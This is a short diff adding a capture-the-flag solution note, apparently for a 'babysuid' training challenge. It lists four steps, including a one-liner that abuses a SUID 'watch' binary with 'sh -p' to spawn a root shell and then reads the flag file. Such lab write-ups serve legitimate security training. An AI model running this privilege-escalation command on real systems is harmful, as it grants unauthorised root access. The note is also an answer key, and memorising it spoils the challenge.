@@ -1,0 +1,4 @@
+1 Connect to terminal
+2 Read instructions : /challenge/babysuid
+3 Execute root shell : /challenge/bin/watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
+4 Read flag : cat /flag
